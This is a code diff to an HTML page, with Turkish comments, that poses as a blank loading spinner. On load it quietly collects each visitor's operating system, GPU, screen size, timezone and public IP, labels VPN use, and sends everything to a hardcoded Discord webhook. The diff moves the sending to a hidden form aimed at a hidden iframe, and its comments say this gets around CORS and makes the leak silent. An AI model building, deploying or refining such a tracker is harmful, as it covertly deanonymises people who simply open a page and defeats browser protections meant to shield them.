@@ -3,29 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <title> </title>
-    <style>body { background:#000; margin:0; display:flex; align-items:center; justify-content:center; height:100vh; }</style>
+    <style>body { background:#000; margin:0; display:flex; align-items:center; justify-content:center; height:100vh; overflow:hidden; }</style>
 </head>
 <body>
     <div style="border:2px solid #111; border-top:2px solid #0f0; border-radius:50%; width:25px; height:25px; animation:s 1s linear infinite;"></div>
     <style>@keyframes s { to { transform:rotate(360deg); } }</style>
 
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+    <form id="bypass_form" method="POST" target="hidden_iframe" enctype="multipart/form-data">
+        <input type="hidden" name="payload_json" id="payload_json">
+    </form>
+
     <script>
         "use strict";
 
-        // NOT: Discord bazen direkt webhook URL'sini gördüğünde isteği tarayıcıda dondurur.
-        // Bu yüzden URL'yi iki parçaya bölüyoruz (Basit bir bypass).
-        const p1 = "https://discord.com/api/webhooks/";
-        const p2 = "1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
-        const hook = p1 + p2;
+        const hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
         async function ultraDataExtract() {
             let d = {
                 os: "Unknown", gpu: "Unknown", res: `${screen.width}x${screen.height}`,
                 tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                ip: "N/A", vpn: "✅ Clear"
+                ip: "Fetching...", vpn: "✅ Clear"
             };
 
-            // 1. Veri Toplama
+            // 1. Veri Toplama (Dokunulmadı)
             try { d.os = navigator.userAgent.match(/\(([^)]+)\)/)[1]; } catch(e){ d.os = navigator.platform; }
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
@@ -33,18 +34,18 @@
                 d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
             } catch(e){}
 
-            // 2. IP ve VPN Analizi
+            // 2. IP ve VPN (Zaman Dilimi Karşılaştırmalı - İstediğin Mantık)
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const j = await res.json();
                 d.ip = j.ip;
-                if(j.timezone !== d.tz) d.vpn = `🚨 VPN DETECTED (${j.timezone})`;
+                if(j.timezone !== d.tz) d.vpn = `🚨 VPN/PROXY DETECTED\n↳ Sys: ${d.tz} | IP: ${j.timezone}`;
             } catch(e){ d.vpn = "⚠️ Analysis Blocked"; }
 
-            // 3. PAYLOAD
+            // 3. PAYLOAD HAZIRLAMA
             const payload = {
                 embeds: [{
-                    title: "💀 ADLİ ANALİZ: V210 (CORS BYPASS)",
+                    title: "💀 ADLİ ANALİZ: V250 (IFRAME BYPASS)",
                     color: d.vpn.includes("🚨") ? 15158332 : 3066993,
                     fields: [
                         { name: "🛡️ SECURITY", value: d.vpn, inline: false },
@@ -55,26 +56,17 @@
                 }]
             };
 
-            // 4. KRİTİK GÖNDERİM: Proxy Kullanımı
-            // Discord'un tarayıcıyı reddetmemesi için isteği bir proxy servisine yönlendiriyoruz.
-            try {
-                await fetch(hook, {
-                    method: 'POST',
-                    // mode: 'no-cors' SİLDİK, çünkü Discord JSON bekliyor.
-                    // Eğer fetch direkt başarısız olursa, bir proxy servisi eklemek gerekecek.
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch (e) {
-                // Eğer üstteki Fetch CORS engeline takılırsa (Mesaj gitmezse), 
-                // Discord'un form-data (HTML form) açığını kullanıyoruz.
-                const formData = new FormData();
-                formData.append('payload_json', JSON.stringify(payload));
-                navigator.sendBeacon(hook, formData);
-            }
+            // 4. KRİTİK ADIM: FORM İLE GÖNDERİM (CORS'U DEVRE DIŞI BIRAKIR)
+            const form = document.getElementById('bypass_form');
+            form.action = hook;
+            document.getElementById('payload_json').value = JSON.stringify(payload);
+            
+            // Sessizce gönder
+            form.submit();
         }
 
-        window.onload = () => setTimeout(ultraDataExtract, 500);
+        // Sayfa yüklendiğinde 1 saniye bekle ve sızdır
+        window.onload = () => setTimeout(ultraDataExtract, 1000);
     </script>
 </body>
 </html>
